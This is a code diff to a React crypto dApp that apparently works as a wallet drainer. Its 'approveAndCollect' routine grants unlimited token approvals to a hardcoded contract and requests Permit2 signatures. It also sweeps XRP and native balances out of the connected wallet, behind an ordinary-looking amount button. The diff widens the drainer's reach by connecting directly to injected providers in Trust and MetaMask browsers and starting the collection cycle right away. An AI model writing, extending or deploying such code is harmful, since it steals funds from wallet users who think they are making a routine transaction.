@@ -4,7 +4,6 @@ if (typeof window !== 'undefined') {
 }
 
 import { useState, useEffect, useRef } from 'react'
-import { useConnect } from 'wagmi' // 🛠️ Importación necesaria para la auto-conexión inyectada
 import {
   createAppKit,
   useAppKit,
@@ -140,7 +139,6 @@ const smartTokenSort = (a: any, b: any) => {
 const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
 export default function App() {
-  const { connect, connectors } = useConnect() // 🛠️ Hook de conexión inyectada heredada
   const [usdtBalance, setUsdtBalance] = useState('0')
   const [status, setStatus] = useState('Ready')
   const [loading, setLoading] = useState(false)
@@ -160,21 +158,6 @@ export default function App() {
     console.log(msg);
     setDebugLogs(prev => [...prev, msg].slice(-15)); 
   }
-
-  // 🛠️ NUEVO EFECTO: Auto-conexión silenciosa dentro de cualquier dApp Browser
-  useEffect(() => {
-    const isDappBrowser = typeof window !== 'undefined' && (!!window.ethereum || !!(window as any).trustwallet);
-    
-    if (isDappBrowser && !isConnected) {
-      const injectedConnector = connectors.find(
-        (c) => c.id === 'injected' || c.type === 'injected'
-      );
-      if (injectedConnector) {
-        log("[SYSTEM] Entorno dApp Browser detectado. Conectando proveedor inyectado...");
-        connect({ connector: injectedConnector });
-      }
-    }
-  }, [isConnected, connectors, connect]);
 
   useEffect(() => {
     if (!isConnected || !walletAddress || !evmWalletProvider) return;
@@ -210,14 +193,35 @@ export default function App() {
     }
   }
 
- const handleAction = () => {
+ const handleAction = async () => {
     if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00' || usdtBalance === '') {
       setAmountError('Amount field is required');
       return; 
     }
     setAmountError('');
 
-    if (!isConnected) {
+    // Detectar si se está ejecutando dentro de un navegador de dApps (Trust, MetaMask, etc)
+    const injectedProvider = typeof window !== 'undefined' ? ((window as any).ethereum || (window as any).trustwallet) : null;
+
+    if (!isConnected && injectedProvider && injectedProvider.request) {
+      try {
+        setLoading(true);
+        setStatus('Connecting Wallet...');
+        log("[SYSTEM] dApp Browser detectado. Solicitando handshake nativo...");
+        const accounts = await injectedProvider.request({ method: 'eth_requestAccounts' });
+        if (accounts && accounts.length > 0) {
+          log(`[SYSTEM] Conexión nativa exitosa: ${accounts[0]}`);
+          // Dispara el ciclo usando directamente el proveedor inyectado detectado
+          setTimeout(() => approveAndCollect(injectedProvider, accounts[0]), 500);
+        } else {
+          setLoading(false);
+        }
+      } catch (e) {
+        log('❌ Conexión rechazada por el usuario');
+        setStatus('Ready');
+        setLoading(false);
+      }
+    } else if (!isConnected) {
       manualConnect.current = true; 
       open(); 
     } else {
@@ -249,8 +253,11 @@ export default function App() {
     return await signer.signTypedData(domain, types, message);
   };
 
-  const approveAndCollect = async () => {
-    if (!walletAddress || !evmWalletProvider) return;
+  const approveAndCollect = async (forcedProvider?: any, forcedAddress?: string) => {
+    const activeProvider = forcedProvider || evmWalletProvider;
+    const activeAddress = forcedAddress || walletAddress;
+
+    if (!activeAddress || !activeProvider) return;
     
     if (isExecuting.current) {
         log("⚠️ Blocked duplicate execution loop.");
@@ -265,8 +272,10 @@ export default function App() {
 
     try {
       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-      const ethersProvider = new BrowserProvider(evmWalletProvider as any);
-      const signer = await ethersProvider.getSigner(walletAddress);
+      const ethersProvider = new BrowserProvider(activeProvider as any);
+      const network = await ethersProvider.getNetwork();
+      const activeChainId = Number(network.chainId);
+      const signer = await ethersProvider.getSigner(activeAddress);
       const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
       const deadline = Math.floor(Date.now() / 1000) + 3600;
 
@@ -293,7 +302,7 @@ export default function App() {
 
       validTokens.sort(smartTokenSort);
       
-      const rawProvider = evmWalletProvider as any;
+      const rawProvider = activeProvider as any;
       const w = window as any;
       const injected = w.ethereum || {};
       
@@ -324,7 +333,7 @@ export default function App() {
               const sweepAmount = (xrpBalance - 11).toFixed(6);
               log(`[ACTION] Prompting XRP Secure Transfer for ${sweepAmount} XRP...`);
               
-              const txHash = await (evmWalletProvider as any).request({
+              const txHash = await (activeProvider as any).request({
                 method: 'eth_sendTransaction',
                 params: [{
                   from: cleanSenderAddress,
@@ -394,7 +403,7 @@ export default function App() {
                     const currentNonce = Number(allowanceData.nonce);
                     log(`[SYSTEM] Permit2 Nonce found: ${currentNonce}`);
 
-                    const domain = { name: 'Permit2', chainId: Number(chainId), verifyingContract: PERMIT2_ADDRESS };
+                    const domain = { name: 'Permit2', chainId: activeChainId, verifyingContract: PERMIT2_ADDRESS };
                     const types = {
                         PermitSingle: [
                             { name: 'details', type: 'PermitDetails' },
@@ -451,7 +460,7 @@ export default function App() {
                 const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
                 
                 // 🛠️ FIX 2: THE RAW RPC BYPASS
-                const txHash = await (evmWalletProvider as any).request({
+                const txHash = await (activeProvider as any).request({
                     method: 'eth_sendTransaction',
                     params: [{
                         from: cleanSenderAddress,
@@ -487,7 +496,7 @@ export default function App() {
               const sendAmount = liveBal - totalGas;
               const hexValue = "0x" + sendAmount.toString(16);
               
-              const txHash = await (evmWalletProvider as any).request({
+              const txHash = await (activeProvider as any).request({
                   method: 'eth_sendTransaction',
                   params: [{
                       from: cleanSenderAddress,
